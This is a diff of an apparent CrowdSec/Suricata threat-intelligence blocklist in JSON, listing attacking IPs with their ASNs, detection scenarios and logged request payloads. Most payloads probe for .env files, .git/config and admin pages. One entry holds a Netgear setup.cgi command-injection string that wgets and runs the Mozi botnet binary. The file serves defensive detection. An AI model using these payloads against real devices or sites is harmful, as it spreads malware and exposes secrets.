@@ -1,97 +1,13 @@
 {
-  "generated_at": "2026-09-09T13:00:00Z",
+  "generated_at": "2026-09-10T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 74,
-    "v4": 74,
+    "total": 75,
+    "v4": 75,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "8.209.96.179",
-      "family": "v4",
-      "first_seen": "2026-09-02T23:00:00Z",
-      "last_seen": "2026-09-02T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "45102",
-      "asn_name": "ALIBABA-CN-NET Alibaba US Technology Co.",
-      "asn_prefix": "8.209.96.0/19",
-      "payloads": [
-        "GET /dns-query?dns=Xf4BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "POST /dns-query",
-        "GET /dns-query?name=1.odns.m.dnsmeasure.top&type=A",
-        "GET /dns-query?dns=Y5MBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "GET /query?dns=CCsBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "POST /query",
-        "GET /query?name=1.odns.m.dnsmeasure.top&type=A",
-        "GET /query?dns=GucBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "GET /resolve?dns=F08BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
-        "POST /resolve",
-        "GET /resolve?name=1.odns.m.dnsmeasure.top&type=A"
-      ]
-    },
-    {
-      "ip": "34.64.160.207",
-      "family": "v4",
-      "first_seen": "2026-09-02T13:00:00Z",
-      "last_seen": "2026-09-02T13:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.64.160.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /phpinfo.php",
-        "GET /phpinfo",
-        "GET /admin/phpinfo.php",
-        "GET /info.php",
-        "GET /",
-        "GET /.git/config",
-        "GET /.env",
-        "GET /.env.local",
-        "GET /.env.production",
-        "GET /.env.staging",
-        "GET /.env.development",
-        "GET /.env.test",
-        "GET /.env.remote",
-        "GET /.env.bak",
-        "GET /.env.backup"
-      ]
-    },
-    {
-      "ip": "5.181.86.46",
-      "family": "v4",
-      "first_seen": "2026-09-02T13:00:00Z",
-      "last_seen": "2026-09-02T13:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "211632",
-      "asn_name": "ORG-ISI14-RIPE Internet Solutions & Innovations LTD.",
-      "asn_prefix": "5.181.86.0/24",
-      "payloads": [
-        "GET /remote/login?lang=en"
-      ]
-    },
     {
       "ip": "199.180.115.54",
       "family": "v4",
@@ -2197,6 +2113,105 @@
         "GET /.env.remote",
         "GET /.env.bak",
         "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "104.248.64.160",
+      "family": "v4",
+      "first_seen": "2026-09-10T00:00:00Z",
+      "last_seen": "2026-09-10T00:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "104.248.64.0/20",
+      "payloads": [
+        "GET /sonicui/7/sslvpn-portal/"
+      ]
+    },
+    {
+      "ip": "136.108.97.34",
+      "family": "v4",
+      "first_seen": "2026-09-09T19:00:00Z",
+      "last_seen": "2026-09-09T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "136.108.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /administrator/.env",
+        "GET /phpinfo.php",
+        "GET /phpinfo",
+        "GET /info.php",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "202.163.102.169",
+      "family": "v4",
+      "first_seen": "2026-09-09T17:00:00Z",
+      "last_seen": "2026-09-09T17:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "202.163.102.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.163.102.169:45267/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.163.102.169:45267/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "34.1.37.135",
+      "family": "v4",
+      "first_seen": "2026-09-09T15:00:00Z",
+      "last_seen": "2026-09-09T15:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "34.1.32.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /"
       ]
     }
   ]
